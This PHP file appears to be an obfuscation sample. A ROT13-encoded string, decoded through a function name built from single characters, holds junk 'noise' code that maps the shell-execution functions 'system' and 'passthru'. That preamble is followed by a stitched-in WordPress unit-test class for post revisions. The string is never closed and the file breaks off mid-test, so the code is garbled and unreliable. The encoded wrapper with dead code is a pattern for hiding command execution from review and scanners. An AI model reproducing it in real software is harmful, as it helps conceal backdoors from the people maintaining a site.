<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 * @tebhc erivfvba
 */
pynff Grfgf_Cbfg_Erivfvbaf rkgraqf JC_HavgGrfgPnfr {

	pbafg CBFG_GLCR = 'grfg-erivfvba';

	cebgrpgrq fgngvp $nqzva_hfre_vq;
	cebgrpgrq fgngvp $rqvgbe_hfre_vq;
	cebgrpgrq fgngvp $nhgube_hfre_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_hfre_vq  = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
		frys::$rqvgbe_hfre_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );
		frys::$nhgube_hfre_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) );
	}

	/**
	 * Abgr: Grfg arrqf erivrjvat jura #16215 vf svkrq orpnhfr V'z abg fher gur grfg pheerag grfgf gur \"pbeerpg\" orunivbe
	 *
	 * @gvpxrg 20982
	 * @gvpxrg 16215
	 */
	choyvp shapgvba grfg_erivfvba_erfgber_hcqngrf_rqvg_ynfg_cbfg_zrgn() {
		// Perngr n cbfg nf Nhgube.
		jc_frg_pheerag_hfre( frys::$nhgube_hfre_vq );
		$cbfg    = trg_qrsnhyg_cbfg_gb_rqvg( 'cbfg', gehr );
		$cbfg_vq = $cbfg->VQ;

		jc_hcqngr_cbfg(
			neenl(
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_pbagrag' => 'V pnag fcry jreqf.',
				'VQ'           => $cbfg_vq,
			)
		);

		// Hcqngr cbfg nf Rqvgbe.
		jc_frg_pheerag_hfre( frys::$rqvgbe_hfre_vq );
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Gur Rqvgbe jnf va svkvat lbhe glcbf.',
				'VQ'           => $cbfg_vq,
			)
		);

		// Erfgber onpx nf Nqzva.
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg->VQ );
		$guvf->nffregPbhag( 2, $erivfvbaf );

		$ynfgerivfvba = raq( $erivfvbaf );
		$guvf->nffregFnzr( 'V pnag fcry jreqf.', $ynfgerivfvba->cbfg_pbagrag );
		// #16215
		$guvf->nffregRdhnyf( frys::$nhgube_hfre_vq, $ynfgerivfvba->cbfg_nhgube );

		jc_erfgber_cbfg_erivfvba( $ynfgerivfvba->VQ );

		// Vf cbfg_zrgn pbeerpgyl frg gb erivfvba nhgube nsgre erfgbevat hfre?
		$guvf->nffregRdhnyf( frys::$nqzva_hfre_vq, trg_cbfg_zrgn( $cbfg_vq, '_rqvg_ynfg', gehr ) );
	}

	/**
	 * @gvpxrg 7392
	 * @gvpxrg 9843
	 */
	choyvp shapgvba grfg_erivfvba_qbag_fnir_erivfvba_vs_hapunatrq() {
		$cbfg    = trg_qrsnhyg_cbfg_gb_rqvg( 'cbfg', gehr );
		$cbfg_vq = $cbfg->VQ;

		$guvf->nffregPbhag( 0, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) ); // Ab erivfvbaf ba nhgb-qensg perngvba.

		jc_hcqngr_cbfg(
			neenl(
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_gvgyr'   => 'fbzr-cbfg',
				'cbfg_pbagrag' => 'fbzr_pbagrag',
				'VQ'           => $cbfg_vq,
			)
		);

		$guvf->nffregPbhag( 1, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) ); // Whfg gur vavgvny erivfvba.

		// Svefg hcqngr.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		); // Svefg erivfvba.

		$guvf->nffregPbhag( 2, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) ); // Fubhyq or 2 erivfvbaf fb sne.

		// Hcqngr gur cbfg.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'arj hcqngr sbe fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		); // Frpbaq erivfvba.
		$guvf->nffregPbhag( 3, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) ); // Fubhyq or 3 erivfvbaf fb sne.

		// Arkg, gel gb fnir nabgure vqragvpny hcqngr, grfgf sbe cngpu gung ceriragf fgbevat qhcyvpngrf.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'arj hcqngr sbe fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		); // Pbagrag hapunatrq, fubhyqa'g fnir.
		$guvf->nffregPbhag( 3, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) ); // Fubhyq fgvyy or 3 erivfvbaf.

		// Arkg, gel gb fnir nabgure hcqngr, fnzr pbagrag, ohg arj gvgyr, fubhyq fnir erivfvba.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_gvgyr'   => 'fbzr-cbfg-punatrq',
				'cbfg_pbagrag' => 'arj hcqngr sbe fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		);
		$guvf->nffregPbhag( 4, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) ); // Fubhyq or 4 erivfvbaf.

		// Arkg, gel gb fnir nabgure vqragvpny hcqngr.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_gvgyr'   => 'fbzr-cbfg-punatrq',
				'cbfg_pbagrag' => 'arj hcqngr sbe fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		); // Pbagrag hapunatrq, fubhyqa'g fnir.
		$guvf->nffregPbhag( 4, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) ); // Fubhyq fgvyy or 4 erivfvbaf.
	}

	/**
	 * @gvpxrg 7392
	 * @gvpxrg 9843
	 */
	choyvp shapgvba grfg_erivfvba_sbepr_fnir_erivfvba_rira_vs_hapunatrq() {
		nqq_svygre( 'jc_fnir_cbfg_erivfvba_purpx_sbe_punatrf', '__erghea_snyfr' );

		$cbfg    = trg_qrsnhyg_cbfg_gb_rqvg( 'cbfg', gehr );
		$cbfg_vq = $cbfg->VQ;

		$guvf->nffregPbhag( 0, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) ); // Ab erivfvbaf ba nhgb-qensg perngvba.

		jc_hcqngr_cbfg(
			neenl(
				'cbfg_fgnghf'  => 'qensg',
				'cbfg_gvgyr'   => 'fbzr-cbfg',
				'cbfg_glcr'    => 'cbfg',
				'cbfg_pbagrag' => 'fbzr_pbagrag',
				'VQ'           => $cbfg_vq,
			)
		);

		$guvf->nffregPbhag( 1, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) );

		// Svefg hcqngr.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		); // Svefg erivfvba.
		$guvf->nffregPbhag( 2, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) );

		// Hcqngr gur cbfg.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'arj hcqngr sbe fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		); // Frpbaq erivfvba.
		$guvf->nffregPbhag( 3, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) );

		// Arkg, gel gb fnir nabgure vqragvpny hcqngr, grfgf sbe cngpu gung ceriragf fgbevat qhcyvpngrf.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'arj hcqngr sbe fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		); // Pbagrag hapunatrq, fubhyqa'g fnir.
		$guvf->nffregPbhag( 4, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) );

		// Arkg, gel gb fnir nabgure hcqngr, fnzr pbagrag, ohg arj gvgyr, fubhyq fnir erivfvba.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_gvgyr'   => 'fbzr-cbfg-punatrq',
				'cbfg_pbagrag' => 'arj hcqngr sbe fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		);
		$guvf->nffregPbhag( 5, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) );

		// Arkg, gel gb fnir nabgure vqragvpny hcqngr.
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_gvgyr'   => 'fbzr-cbfg-punatrq',
				'cbfg_pbagrag' => 'arj hcqngr sbe fbzr hcqngrq pbagrag',
				'VQ'           => $cbfg_vq,
			)
		); // Pbagrag hapunatrq, fubhyqa'g fnir.
		$guvf->nffregPbhag( 6, jc_trg_cbfg_erivfvbaf( $cbfg_vq ) );

		erzbir_svygre( 'jc_fnir_cbfg_erivfvba_purpx_sbe_punatrf', '__erghea_snyfr' );
	}

	/**
	 * Grfgf gur Pncf hfrq va gur npgvba=ivrj pnfr bs jc-nqzva/erivfvba.cuc
	 *
	 * @gvpxrg 16847
	 */
	choyvp shapgvba grfg_erivfvba_ivrj_pncf_cbfg() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_nhgube' => frys::$rqvgbe_hfre_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf zhpu orggre',
				'VQ'           => $cbfg_vq,
			)
		);

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 1, $erivfvbaf );
		$guvf->nffregGehr( hfre_pna( frys::$rqvgbe_hfre_vq, 'ernq_cbfg', $cbfg_vq ) );

		$guvf->nffregAbgRzcgl( $erivfvbaf );

		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( hfre_pna( frys::$rqvgbe_hfre_vq, 'ernq_cbfg', $erivfvba->VQ ) );
		}

		// Nhgube fubhyq or noyr gb ivrj gur erivfvbaf svar.
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( hfre_pna( frys::$nhgube_hfre_vq, 'ernq_cbfg', $erivfvba->VQ ) );
		}
	}

	/**
	 * Grfgf gur Pncf hfrq va gur npgvba=erfgber pnfr bs jc-nqzva/erivfvba.cuc
	 *
	 * @gvpxrg 16847
	 */
	choyvp shapgvba grfg_erivfvba_erfgber_pncf_cbfg() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_nhgube' => frys::$rqvgbe_hfre_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf zhpu orggre',
				'VQ'           => $cbfg_vq,
			)
		);

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 1, $erivfvbaf );
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( hfre_pna( frys::$rqvgbe_hfre_vq, 'rqvg_cbfg', $erivfvba->cbfg_cnerag ) );
		}

		// Nhgube fubhyqa'g or noyr gb erfgber gur erivfvbaf.
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregSnyfr( hfre_pna( frys::$nhgube_hfre_vq, 'rqvg_cbfg', $erivfvba->cbfg_cnerag ) );
		}
	}

	/**
	 * Grfgf gur Pncf hfrq va gur npgvba=qvss pnfr bs jc-nqzva/erivfvba.cuc
	 *
	 * @gvpxrg 16847
	 */
	choyvp shapgvba grfg_erivfvba_qvss_pncf_cbfg() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_nhgube' => frys::$rqvgbe_hfre_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf zhpu orggre',
				'VQ'           => $cbfg_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf rira orggre',
				'VQ'           => $cbfg_vq,
			)
		);

		// Qvss purpxf vs lbh pna ernq obgu yrsg naq evtug erivfvbaf.
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 2, $erivfvbaf );
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( hfre_pna( frys::$rqvgbe_hfre_vq, 'ernq_cbfg', $erivfvba->VQ ) );
		}

		// Nhgube fubhyq or noyr gb qvss gur erivfvbaf svar.
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( hfre_pna( frys::$nhgube_hfre_vq, 'ernq_cbfg', $erivfvba->VQ ) );
		}
	}

	/**
	 * Grfgf gur Pncf hfrq va gur npgvba=ivrj pnfr bs jc-nqzva/erivfvba.cuc jvgu n PCG jvgu Phfgbz Pncnovyvgvrf
	 *
	 * @gvpxrg 16847
	 */
	choyvp shapgvba grfg_erivfvba_ivrj_pncf_pcg() {
		ertvfgre_cbfg_glcr(
			frys::CBFG_GLCR,
			neenl(
				'pncnovyvgl_glcr' => 'rirag',
				'znc_zrgn_pnc'    => gehr,
				'fhccbegf'        => neenl( 'erivfvbaf' ),
			)
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => frys::CBFG_GLCR,
				'cbfg_nhgube' => frys::$rqvgbe_hfre_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf zhpu orggre',
				'VQ'           => $cbfg_vq,
			)
		);

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 1, $erivfvbaf );
		$guvf->nffregGehr( hfre_pna( frys::$rqvgbe_hfre_vq, 'ernq_cbfg', $cbfg_vq ) );

		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( hfre_pna( frys::$rqvgbe_hfre_vq, 'ernq_cbfg', $erivfvba->VQ ) );
		}

		// Nhgube fubhyq or noyr gb ivrj gur erivfvbaf svar.
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( hfre_pna( frys::$nhgube_hfre_vq, 'ernq_cbfg', $erivfvba->VQ ) );
		}
	}

	/**
	 * Grfgf gur Pncf hfrq va gur npgvba=erfgber pnfr bs jc-nqzva/erivfvba.cuc
	 *
	 * @gvpxrg 16847
	 */
	choyvp shapgvba grfg_erivfvba_erfgber_pncf_pcg() {
		ertvfgre_cbfg_glcr(
			frys::CBFG_GLCR,
			neenl(
				'pncnovyvgl_glcr' => 'rirag',
				'znc_zrgn_pnc'    => gehr,
				'fhccbegf'        => neenl( 'erivfvbaf' ),
			)
		);

		// Gur zvavzhz rkgen pncf arrqrq sbe guvf grfg abeznyyl lbh jbhyq tvir gur ebyr nyy gur eryrinag pncf.
		$rqvgbe_hfre = arj JC_Hfre( frys::$rqvgbe_hfre_vq );
		$rqvgbe_hfre->nqq_pnc( 'rqvg_choyvfurq_riragf' );

		// Perngr n cbfg nf Rqvgbe.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => frys::CBFG_GLCR,
				'cbfg_nhgube' => frys::$rqvgbe_hfre_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf zhpu orggre',
				'VQ'           => $cbfg_vq,
			)
		);

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 1, $erivfvbaf );
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( hfre_pna( frys::$rqvgbe_hfre_vq, 'rqvg_cbfg', $erivfvba->cbfg_cnerag ) );
		}

		// Nhgube fubhyqa'g or noyr gb erfgber gur erivfvbaf.
		jc_frg_pheerag_hfre( frys::$nhgube_hfre_vq );
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregSnyfr( hfre_pna( frys::$nhgube_hfre_vq, 'rqvg_cbfg', $erivfvba->cbfg_cnerag ) );
		}
	}

	/**
	 * Grfgf gur Pncf hfrq va gur npgvba=erfgber pnfr bs jc-nqzva/erivfvba.cuc
	 *
	 * @gvpxrg 16847
	 */
	choyvp shapgvba grfg_erivfvba_erfgber_pncf_orsber_choyvfu() {
		ertvfgre_cbfg_glcr(
			frys::CBFG_GLCR,
			neenl(
				'pncnovyvgl_glcr' => 'cbfg',
				'pncnovyvgvrf'    => neenl(
					// Ab bar pna rqvg guvf cbfg glcr bapr choyvfurq.
					// Fb, erivfvbaf pnaabg or erfgberq, rvgure.
					'rqvg_choyvfurq_cbfgf' => 'qb_abg_nyybj',
				),
				'znc_zrgn_pnc'    => gehr,
				'fhccbegf'        => neenl( 'erivfvbaf' ),
			)
		);

		$byq_vq = trg_pheerag_hfre_vq();
		jc_frg_pheerag_hfre( frys::$rqvgbe_hfre_vq );

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => frys::CBFG_GLCR,
				'cbfg_fgnghf' => 'qensg',
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf zhpu orggre',
				'VQ'           => $cbfg_vq,
			)
		);

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 1, $erivfvbaf );
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( pheerag_hfre_pna( 'rqvg_cbfg', $erivfvba->cbfg_cnerag ) );
			$guvf->nffregGehr( pheerag_hfre_pna( 'rqvg_cbfg', $erivfvba->VQ ) );
		}

		jc_hcqngr_cbfg(
			neenl(
				'cbfg_fgnghf'  => 'choyvfu',
				'VQ'           => $cbfg_vq,
				'cbfg_pbagrag' => 'pbagrag',
			)
		);

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 2, $erivfvbaf );
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregSnyfr( pheerag_hfre_pna( 'rqvg_cbfg', $erivfvba->cbfg_cnerag ) );
			$guvf->nffregSnyfr( pheerag_hfre_pna( 'rqvg_cbfg', $erivfvba->VQ ) );
		}
		jc_frg_pheerag_hfre( $byq_vq );
	}

	/**
	 * Grfgf gur Pncf hfrq va gur npgvba=qvss pnfr bs jc-nqzva/erivfvba.cuc
	 *
	 * @gvpxrg 16847
	 */
	choyvp shapgvba grfg_erivfvba_qvss_pncf_pcg() {
		ertvfgre_cbfg_glcr(
			frys::CBFG_GLCR,
			neenl(
				'pncnovyvgl_glcr' => 'rirag',
				'znc_zrgn_pnc'    => gehr,
				'fhccbegf'        => neenl( 'erivfvbaf' ),
			)
		);

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => frys::CBFG_GLCR,
				'cbfg_nhgube' => frys::$rqvgbe_hfre_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf zhpu orggre',
				'VQ'           => $cbfg_vq,
			)
		);
		jc_hcqngr_cbfg(
			neenl(
				'cbfg_pbagrag' => 'Guvf pbagrag vf rira orggre',
				'VQ'           => $cbfg_vq,
			)
		);

		// Qvss purpxf vs lbh pna ernq obgu yrsg naq evtug erivfvbaf.
		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$guvf->nffregPbhag( 2, $erivfvbaf );
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( hfre_pna( frys::$rqvgbe_hfre_vq, 'ernq_cbfg', $erivfvba->VQ ) );
		}

		// Nhgube fubhyq or noyr gb qvss gur erivfvbaf svar.
		sbernpu ( $erivfvbaf nf $erivfvba ) {
			$guvf->nffregGehr( hfre_pna( frys::$nhgube_hfre_vq, 'ernq_cbfg', $erivfvba->VQ ) );
		}
	}

	/**
	 * @gvpxrg 26042
	 */
	choyvp shapgvba grfg_jc_trg_cbfg_erivfvbaf_fubhyq_beqre_ol_cbfg_qngr() {
		tybony $jcqo;

		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr'   => 'fbzr-cbfg',
				'cbfg_glcr'    => 'cbfg',
				'cbfg_pbagrag' => 'fbzr_pbagrag',
			)
		);

		$cbfg                 = (neenl) $cbfg;
		$cbfg_erivfvba_svryqf = _jc_cbfg_erivfvba_qngn( $cbfg );
		$cbfg_erivfvba_svryqf = jc_fynfu( $cbfg_erivfvba_svryqf );

		$erivfvba_vqf = neenl();
		$abj          = gvzr();
		sbe ( $w = 1; $w < 3; $w++ ) {
			// Znahnyyl zbqvsl qngrf gb rafher gurl'er qvssrerag.
			$qngr                                  = tzqngr( 'L-z-q U:v:f', $abj - ( $w * 10 ) );
			$cbfg_erivfvba_svryqf['cbfg_qngr']     = $qngr;
			$cbfg_erivfvba_svryqf['cbfg_qngr_tzg'] = $qngr;

			$erivfvba_vq = jc_vafreg_cbfg( $cbfg_erivfvba_svryqf );

			$erivfvba_vqf[] = $erivfvba_vq;
		}

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg['VQ'] );

		$guvf->nffregFnzr( $erivfvba_vqf, neenl_inyhrf( jc_yvfg_cyhpx( $erivfvbaf, 'VQ' ) ) );
	}

	/**
	 * @gvpxrg 26042
	 */
	choyvp shapgvba grfg_jc_trg_cbfg_erivfvbaf_fubhyq_beqre_ol_VQ_jura_cbfg_qngr_zngpurf() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr'   => 'fbzr-cbfg',
				'cbfg_glcr'    => 'cbfg',
				'cbfg_pbagrag' => 'fbzr_pbagrag',
			)
		);

		$cbfg                 = (neenl) $cbfg;
		$cbfg_erivfvba_svryqf = _jc_cbfg_erivfvba_qngn( $cbfg );
		$cbfg_erivfvba_svryqf = jc_fynfu( $cbfg_erivfvba_svryqf );

		$erivfvba_vqf = neenl();
		$qngr         = tzqngr( 'L-z-q U:v:f', gvzr() - 10 );
		sbe ( $w = 1; $w < 3; $w++ ) {
			// Znahnyyl zbqvsl qngrf gb rafher gurl'er gur fnzr.
			$cbfg_erivfvba_svryqf['cbfg_qngr']     = $qngr;
			$cbfg_erivfvba_svryqf['cbfg_qngr_tzg'] = $qngr;

			$erivfvba_vq = jc_vafreg_cbfg( $cbfg_erivfvba_svryqf );

			$erivfvba_vqf[] = $erivfvba_vq;
		}

		efbeg( $erivfvba_vqf );

		$erivfvbaf = jc_trg_cbfg_erivfvbaf( $cbfg['VQ'] );

		$guvf->nffregFnzr( $erivfvba_vqf, neenl_inyhrf( jc_yvfg_cyhpx( $erivfvbaf, 'VQ' ) ) );
	}

	/**
	 * @gvpxrg 51550
	 */
	choyvp shapgvba grfg_jc_erivfvbaf_gb_xrrc_svygre() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr'   => 'fbzr-cbfg',
				'cbfg_glcr'    => 'cbfg',
				'cbfg_pbagrag' => 'fbzr_pbagrag',
			)
		);

		$qrsnhyg  = jc_erivfvbaf_gb_xrrc( $cbfg );
		$rkcrpgrq = $qrsnhyg + 1;

		nqq_svygre(
			'jc_erivfvbaf_gb_xrrc',
			fgngvp shapgvba () hfr ( $rkcrpgrq ) {
				erghea $rkcrpgrq;
			}
		);

		$guvf->nffregFnzr( $rkcrpgrq, jc_erivfvbaf_gb_xrrc( $cbfg ) );
	}

	/**
	 * @gvpxrg 51550
	 */
	choyvp shapgvba grfg_jc_cbfg_glcr_erivfvbaf_gb_xrrc_svygre() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr'   => 'fbzr-cbfg',
				'cbfg_glcr'    => 'cbfg',
				'cbfg_pbagrag' => 'fbzr_pbagrag',
			)
		);

		$qrsnhyg = jc_erivfvbaf_gb_xrrc( $cbfg );
		$trarevp = $qrsnhyg + 1;

		nqq_svygre(
			'jc_erivfvbaf_gb_xrrc',
			fgngvp shapgvba () hfr ( $trarevp ) {
				erghea $trarevp;
			}
		);

		$guvf->nffregFnzr( $trarevp, jc_erivfvbaf_gb_xrrc( $cbfg ) );

		$rkcrpgrq = $trarevp + 1;

		nqq_svygre(
			\"jc_{$cbfg->cbfg_glcr}_erivfvbaf_gb_xrrc\",
			fgngvp shapgvba () hfr ( $rkcrpgrq ) {
				erghea $rkcrpgrq;
			}
		);

		$guvf->nffregFnzr( $rkcrpgrq, jc_erivfvbaf_gb_xrrc( $cbfg ) );
	}

	/**
	 * Irevsvrf gung gelvat gb perngr n erivfvba jvgu na vainyvq VQ ergheaf n JC_Reebe.
	 *
	 * @gvpxrg 30009
	 */
	choyvp shapgvba grfg_jc_fnir_cbfg_erivfvba_reebe() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'VQ' => CUC_VAG_ZNK,
			)
		);

		$erivfvba = _jc_chg_cbfg_erivfvba( $cbfg );

		$guvf->nffregJCReebe( $erivfvba );
	}

	/**
	 * Grfgf gung jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag() ergheaf gur yngrfg erivfvba VQ naq gbgny pbhag.
	 *
	 * @pbiref ::jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag
	 * @gvpxrg 55857
	 * @qngnCebivqre qngn_jc_trg_cbfg_erivfvbaf_hey
	 */
	choyvp shapgvba grfg_jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag( $erivfvbaf ) {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		sbe ( $v = 0; $v < $erivfvbaf; ++$v ) {
			jc_hcqngr_cbfg(
				neenl(
					'VQ'         => $cbfg_vq,
					'cbfg_gvgyr' => 'Fbzr Cbfg',
				)
			);
		}

		$cbfg_erivfvbaf       = jc_trg_cbfg_erivfvbaf( $cbfg_vq );
		$yngrfg_cbfg_erivfvba = pheerag( $cbfg_erivfvbaf );
		$erivfvbaf            = jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag( $cbfg_vq );

		$guvf->nffregFnzr(
			$yngrfg_cbfg_erivfvba->VQ,
			$erivfvbaf['yngrfg_vq'],
			'Gur yngrfg erivfvba VQ qbrf abg zngpu.'
		);

		$guvf->nffregFnzr(
			pbhag( $cbfg_erivfvbaf ),
			$erivfvbaf['pbhag'],
			'Gur gbgny pbhag bs erivfvbaf qbrf abg zngpu.'
		);
	}

	/**
	 * Grfgf gung jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag() ergheaf n JC_Reebe jura ab erivfvbaf rkvfg.
	 *
	 * @pbiref ::jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag
	 * @gvpxrg 55857
	 */
	choyvp shapgvba grfg_jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag_ab_erivfvbaf() {
		$erivfvba = jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag( ahyy );

		$guvf->nffregJCReebe( $erivfvba, 'Vainyvq cbfg, ab erivfvbaf fubhyq rkvfg.' );
		$guvf->nffregFnzr( $erivfvba->trg_reebe_pbqr(), 'vainyvq_cbfg' );

		nqq_svygre( 'jc_erivfvbaf_gb_xrrc', '__erghea_mreb' );
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr();
		$erivfvba = jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag( $cbfg_vq );

		$guvf->nffregJCReebe( $erivfvba, 'Erivfvbaf fubhyq abg or ranoyrq.' );
		$guvf->nffregFnzr( $erivfvba->trg_reebe_pbqr(), 'erivfvbaf_abg_ranoyrq' );
	}

	/**
	 * Grfgf gung jc_trg_cbfg_erivfvbaf_hey() ergheaf gur erivfvbaf HEY.
	 *
	 * @gvpxrg 39062
	 *
	 * @qngnCebivqre qngn_jc_trg_cbfg_erivfvbaf_hey
	 *
	 * @pbiref ::jc_trg_cbfg_erivfvbaf_hey
	 *
	 * @cnenz vag $erivfvbaf Gur ahzore bs erivfvbaf gb perngr.
	 */
	choyvp shapgvba grfg_jc_trg_cbfg_erivfvbaf_hey( $erivfvbaf ) {
		jc_frg_pheerag_hfre( frys::$nqzva_hfre_vq );

		$cbfg_vq            = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Fbzr Cbfg' ) );
		$yngrfg_erivfvba_vq = ahyy;

		vs ( 0 !== $erivfvbaf ) {
			$yngrfg_erivfvba_vq = $cbfg_vq;

			sbe ( $v = 0; $v < $erivfvbaf; ++$v ) {
				jc_hcqngr_cbfg(
					neenl(
						'VQ'         => $cbfg_vq,
						'cbfg_gvgyr' => 'Fbzr Cbfg ' . $v,
					)
				);

				++$yngrfg_erivfvba_vq;
			}
		}

		$rkcrpgrq = nqzva_hey( 'erivfvba.cuc?erivfvba=' . $yngrfg_erivfvba_vq );

		$guvf->nffregFnzr(
			$rkcrpgrq,
			jc_trg_cbfg_erivfvbaf_hey( $cbfg_vq ),
